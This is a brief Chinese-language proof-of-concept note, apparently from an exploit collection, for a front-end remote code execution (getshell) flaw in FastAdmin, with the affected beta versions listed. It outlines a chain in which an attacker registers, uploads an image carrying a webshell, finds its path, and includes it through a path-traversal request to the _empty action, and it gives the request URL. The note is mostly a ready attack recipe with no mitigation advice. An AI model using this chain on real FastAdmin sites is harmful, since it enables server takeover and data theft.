# fastadmin前台getshell

> 2020.9

## #影响范围

V1.0.0.20180911_beta - V1.0.0.20200506_beta

在Linux下，通过这种方法会失效，因为在 /public 路径下不存在 user 目录



## #Poc

前台注册 -> 个人资料上传图片马 -> 获取路径 -> 文件包含getshell

```
http://x.x.x.x/index/user/_empty?name=../../public/uploads/路径.jpg
```

